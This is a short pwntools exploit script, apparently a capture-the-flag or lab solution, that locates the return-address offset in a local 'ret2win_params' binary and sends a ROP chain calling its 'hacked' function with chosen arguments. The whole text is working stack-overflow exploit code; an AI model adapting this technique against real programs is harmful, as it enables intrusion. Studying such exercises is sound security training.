from pwn import *

exe = './ret2win_params'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

def find_IP(payload):
    p = process(exe)
    p.sendlineafter(b':', payload)

    p.wait()

    ip_offset = cyclic_find(p.corefile.pc)
    info('Located EIP/RIP at {a}'.format(a=ip_offset))
    return ip_offset

offset = find_IP(cyclic(200))
io = process(exe)

rop = ROP(elf)
rop.hacked(0xdeadbeef, 0xc0debabe)

pprint(rop.dump())

payload = flat({
    offset: rop.chain()
    })

write('payload', payload)

io.sendlineafter(b':', payload)
io.interactive()


